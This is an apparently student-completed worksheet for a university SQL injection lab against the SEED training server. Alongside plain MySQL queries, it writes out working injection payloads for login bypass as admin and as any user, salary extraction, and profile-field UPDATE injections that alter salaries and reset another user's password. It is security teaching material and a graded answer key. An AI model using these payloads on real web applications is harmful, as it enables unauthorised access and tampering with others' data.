@@ -1,0 +1,90 @@
+:lang: en
+:source-highlighter: pygments
+:icons: font
+:xrefstyle: short
+
+
+
+=== https://www.cs.swarthmore.edu/~chaganti/cs88/s24/index.html[CS88] Lab-Worksheet https://www.cs.swarthmore.edu/~chaganti/cs88/s24/labs/lab2a.html[Lab2a: SQL Injection Attacks]
+
+*Lab Due Date: Tuesday, February 20th, 11:59 PM*
+
+*For each of the questions below you only need to provide the SQL command and NOT the responses you get after you execute the command*
+
+. Login via `docksh` to the `mySQL` database and provide the SQL command to print all the profile information for Alice in the `credential` table.
++
+```
+SELECT * FROM credential WHERE Name='Alice';
+```
+
+. Login via `docksh` to the `mySQL` database and provide the SQL command to print all the users with a salary greater than `50,000` in the `credential` table.
++
+```
+SELECT * FROM credential WHERE Salary>50000;
+```
+
+
+. Login via `docksh` to the `mySQL` database and provide the SQL command to update Ted's salary to `120,000` in the `credential` table.
++
+```
+UPDATE credential SET Salary=120000 WHERE Name='Ted';
+```
+
+. Login via `docksh` to the `mySQL` database and provide the prepared SQL command to view all users in the `credential` table with salary greater than $80,000$. You can use this https://dev.mysql.com/doc/refman/8.0/en/sql-prepared-statements.html[link] to learn how to construct prepare statements.
++
+```
+PREPARE cmd1 FROM 'SELECT * FROM credential WHERE Salary>?';
+SET @sal=80000;
+EXECUTE cmd1 USING @sal;
+```
+
+=== SQL Injection Attacks
+
+
+. On the page `www.seed-server.com` Login to the Admin account *without knowing the admin's password*.
++
+```
+Username Field: Admin'  #
+Password Field:
+
+password field can be left blank
+```
+
+. On the page `www.seed-server.com` Login to Alice's account *without knowing her username or her password*. HINT: If there are more than one rows that are returned from an SQL query, the server will display the first row in the list in alphabetical order.
++
+```
+Username Field: ' OR 1=1;  #
+Password Field:
+
+password field can be left blank
+```
+
+. On the page `www.seed-server.com` Alice wants to find out if anyone at her firm earns more than `$80,000`. Describe the SQL attack Alice would use to find any one employee who earns more than `$80,000`, without knowing their name or password.
++
+```
+Username Field: ' OR Salary>80000;  #
+Password Field:
+
+password field can be left blank
+```
+
+. Having discoverd how much more other employees are earning, Alice wants to update her salary. Change Alice's salary to `$90000`. HINT: you can try to compose an Update using the docker terminal, `docksh` and accessing the `mySQL` database and extrapolate that to the web-server update. Also, you can append a new SQL statement by seperating an existing statement with a `;`.
++
+```
+Describe the input parameters for each field in Alice's Profile:
+NickName Field: Al', Salary=90000 WHERE name = 'Alice'; #
+The rest of the fields can be left blank. 
+For this, you can pretty much choose any of the fields to do this in but we recommend not using the password field. You first need to start out with a single quote. You can add stuff before like we did which in this case will change the nickname to whatever you have before the single quote. Everything after is to change the salary even though you are in the nickname field.
+```
+
+. Alice is also upset that her boss Bob, has not been increasing her pay, and therefore she wants to set Bob's salary to `$1` and change his password to something Bob will never guess. Describe both the attacks below. *Launch these attacks when you are logged in as Alice*.
++
+```
+Describe the sequence of steps and the two attack statements.
+NickName Field: Bob', Salary=1 WHERE name='Boby'; #
+  this changes Bob's salary to $1.
+Email Field: ', Password='Banana23ejduw$$' WHERE name='Boby'; #
+  this changes Bob's password to whatever you fill in above in the quotes.
+  
+If you try to set both of these things at the same time, it will only set the first one and leave the second unchanged. Therefore, you should save the first one, then edit profile again to do the second one and save it. For example, the first step would be to edit profile and type what we have above into the NickName field and leave the other fields blank, then save profile. Then edit profile again and do the same but for the second command. It does not matter which field you type it in but we recommend not using the password field.
+```
